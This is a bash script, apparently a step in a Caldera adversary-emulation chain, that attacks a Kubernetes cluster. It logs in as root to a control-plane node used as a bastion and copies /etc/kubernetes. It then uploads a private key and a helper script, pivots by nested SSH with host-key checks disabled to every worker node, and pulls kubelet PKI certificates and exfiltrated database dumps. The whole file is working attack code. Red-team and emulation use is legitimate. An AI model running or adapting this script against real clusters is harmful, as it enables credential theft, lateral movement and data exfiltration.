#!/usr/bin/env bash
set -euo pipefail

# ========== CONFIG ==========
# Bastion
BASTION_USER="root"
BASTION_HOST="$CONTROL_PLANE_NODE"
BASTION_PORT="122"
# Internal targets
TARGET_USER="root"
TARGET_PORT="122"
REMOTE_DIR_WORKER="/host/var/lib/kubelet/pki"
REMOTE_DIR_CP="/host/etc/kubernetes"

SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
OUT_DIR="$DATA_PATH/KC6/nodes-output"

KUBECONFIG="${KUBECONFIG:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
HOSTS_FILE="$DATA_PATH/KC6/iphost"

# ========== PRECHECK ==========
need(){ command -v "$1" >/dev/null 2>&1 || { echo "[-] missing '$1'"; exit 1; }; }
need ssh; need tar; need awk; need jq; need kubectl

[[ -f "$SSH_KEY" ]] || { echo "[-] SSH_KEY not found: $SSH_KEY"; exit 1; }
[[ -f "${SSH_KEY}.pub" ]] || { echo "[-] Pub key missing: ${SSH_KEY}.pub"; exit 1; }

mkdir -p "$OUT_DIR"
TS="$(date -u +%Y%m%d-%H%M%S)"

SSH_OPTS=(
  -n
  -i "$SSH_KEY"
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o IdentitiesOnly=yes
  -o LogLevel=ERROR
)

SCP_OPTS=(
  -i "$SSH_KEY"
  -P "$BASTION_PORT"
  -o BatchMode=yes
  -o ConnectTimeout=8
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o IdentitiesOnly=yes
  -o LogLevel=ERROR
)

# Command executed on bastion to reach workers
REMOTE_SSH_BASE="ssh -i /tmp/key -o BatchMode=yes -o ConnectTimeout=8 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o LogLevel=ERROR"

clean_ssh_reason() { # $1 raw stderr
  local raw="$1"
  local cleaned="" hit=""
  cleaned="$(printf '%s\n' "$raw" \
    | sed '/^Warning: Permanently added .* to the list of known hosts\.$/d' \
    | sed '/^Pseudo-terminal will not be allocated because stdin is not a terminal\.$/d' \
    | sed '/^Connection to .* closed\.$/d' \
    | sed '/^[[:space:]]*$/d')"

  if [[ -z "$cleaned" ]]; then
    printf '%s\n' "$raw" | sed '/^[[:space:]]*$/d' | tail -n1
    return
  fi

  hit="$(printf '%s\n' "$cleaned" | awk '
    /open failed|administratively prohibited|Permission denied|Connection refused|timed out|No route to host|Name or service not known|Connection closed by/ {msg=$0}
    END { if (msg != "") print msg }'
  )"
  if [[ -n "$hit" ]]; then
    echo "$hit"
  else
    printf '%s\n' "$cleaned" | tail -n1
  fi
}

cleanup_bastion_artifacts() {
  ssh "${SSH_OPTS[@]}" -p "$BASTION_PORT" "${BASTION_USER}@${BASTION_HOST}" \
    'rm -f /tmp/key /tmp/container-admin1.sh' >/dev/null 2>&1 || true
}

# ========== 0) BUILDING HOSTS_FILE ==========
echo "[i] generating $HOSTS_FILE from worker nodes"
kubectl --kubeconfig "$KUBECONFIG" get nodes -o json \
| jq -r '.items[]
  | select(.metadata.labels["node-role.kubernetes.io/control-plane"] | not)
  | "\(.status.addresses[] | select(.type=="InternalIP").address | select(test("^[0-9.]+$"))) - \(.metadata.name)"' \
> "$HOSTS_FILE"

# ========== FUNCTIONS ==========
test_ssh() { # $1 user $2 host $3 port
  local user="$1" host="$2" port="$3"
  local err="" reason=""

  if err="$(ssh "${SSH_OPTS[@]}" -p "$port" "$user@$host" 'echo ok' 2>&1 1>/dev/null)"; then
    echo "[+] SSH OK -> $user@$host:$port"
  else
    reason="$(clean_ssh_reason "$err")"
    echo "[-] SSH KO -> $user@$host:$port"
    [[ -n "$reason" ]] && echo "   reason: $reason"
    return 1
  fi
}

test_worker_ssh_via_bastion() { # $1 worker_ip
  local host="$1"
  local err="" reason=""

  if err="$(ssh "${SSH_OPTS[@]}" -p "$BASTION_PORT" "${BASTION_USER}@${BASTION_HOST}" \
      "${REMOTE_SSH_BASE} -p ${TARGET_PORT} ${TARGET_USER}@${host} 'echo ok'" \
      2>&1 1>/dev/null)"; then
    echo "[+] SSH OK -> ${TARGET_USER}@${host}:${TARGET_PORT} (via ${BASTION_HOST})"
  else
    reason="$(clean_ssh_reason "$err")"
    echo "[-] SSH KO -> ${TARGET_USER}@${host}:${TARGET_PORT} (via ${BASTION_HOST})"
    [[ -n "$reason" ]] && echo "   reason: $reason"
    return 1
  fi
}

fetch_dir() { # $1 user $2 host $3 port $4 dest_sub $5 rdir
  local user="$1" host="$2" port="$3" dest_sub="$4" rdir="$5"
  local dest="${OUT_DIR}/${dest_sub}-${TS}"
  echo "[*] ${host}: copying '${rdir}' -> ${dest}/"
  mkdir -p "$dest"
  local parent base
  parent="$(dirname "$rdir")"; base="$(basename "$rdir")"
  ssh "${SSH_OPTS[@]}" -p "$port" "$user@$host" \
    "tar -C \"\$([ -d \"$parent\" ] && echo \"$parent\" || echo /)\" -cpf - \"$base\"" \
    | tar -C "$dest" -xpf - \
    && echo "[+] ${host}: OK -> ${dest}/$base" \
    || { echo "[-] ${host}: copy FAILED"; return 1; }
}

fetch_dir_from_worker_via_bastion() { # $1 worker_ip $2 dest_sub $3 rdir
  local host="$1" dest_sub="$2" rdir="$3"
  local dest="${OUT_DIR}/${dest_sub}-${TS}"
  local parent base
  parent="$(dirname "$rdir")"; base="$(basename "$rdir")"

  echo "[*] ${host}: copying '${rdir}' -> ${dest}/ (via ${BASTION_HOST})"
  mkdir -p "$dest"
  ssh "${SSH_OPTS[@]}" -p "$BASTION_PORT" "${BASTION_USER}@${BASTION_HOST}" \
    "${REMOTE_SSH_BASE} -p ${TARGET_PORT} ${TARGET_USER}@${host} \"tar -C '$parent' -cpf - '$base'\"" \
    | tar -C "$dest" -xpf - \
    && echo "[+] ${host}: OK -> ${dest}/$base" \
    || { echo "[-] ${host}: copy FAILED"; return 1; }
}

# ========== 1) TEST BASTION ==========
test_ssh "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" || {
  echo "   Tips: verification DS on control-plane and key in authorized_keys"; exit 1; }

# ========== 2) COPY FROM BASTION ==========
fetch_dir "$BASTION_USER" "$BASTION_HOST" "$BASTION_PORT" "bastion_${BASTION_HOST}" "$REMOTE_DIR_CP"

# ========== 3) COPY FROM WORKERS (via bastion nested SSH) ==========
if [[ -s "$HOSTS_FILE" ]]; then
  echo "[*] Uploading worker SSH key/script to bastion..."
  scp "${SCP_OPTS[@]}" "/opt/caldera/KC4/container-admin1.sh" "${BASTION_USER}@${BASTION_HOST}:/tmp/container-admin1.sh"
  scp "${SCP_OPTS[@]}" "$SSH_KEY" "${BASTION_USER}@${BASTION_HOST}:/tmp/key"
  ssh "${SSH_OPTS[@]}" -p "$BASTION_PORT" "${BASTION_USER}@${BASTION_HOST}" \
    'chmod +x /tmp/container-admin1.sh && chmod 600 /tmp/key'
  trap cleanup_bastion_artifacts EXIT

  while IFS= read -r line; do
    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    ip="$(echo "$line" | awk -F ' *- *' '{print $1}' | xargs)"
    tag="${line#* - }"
    [[ -z "$tag" ]] && tag="$ip"

    # test worker ssh from bastion
    if ! test_worker_ssh_via_bastion "$ip"; then
      echo "   (skip $ip)"; continue
    fi

    fetch_dir_from_worker_via_bastion "$ip" "$tag" "$REMOTE_DIR_WORKER"

    # Executing exfiltration from DBs
    echo "Run script in pod"
    ssh "${SSH_OPTS[@]}" -p "$BASTION_PORT" "${BASTION_USER}@${BASTION_HOST}" \
      "${REMOTE_SSH_BASE} -p ${TARGET_PORT} ${TARGET_USER}@${ip} '/usr/bin/env bash -s -- 1' < /tmp/container-admin1.sh"
    fetch_dir_from_worker_via_bastion "$ip" "$tag" "/tmp/exfiltration/dbs"
      
  done < "$HOSTS_FILE"
else
  echo "[!] HOSTS_FILE empty: $HOSTS_FILE"
fi

echo "[✓] Done. Output in: $OUT_DIR"
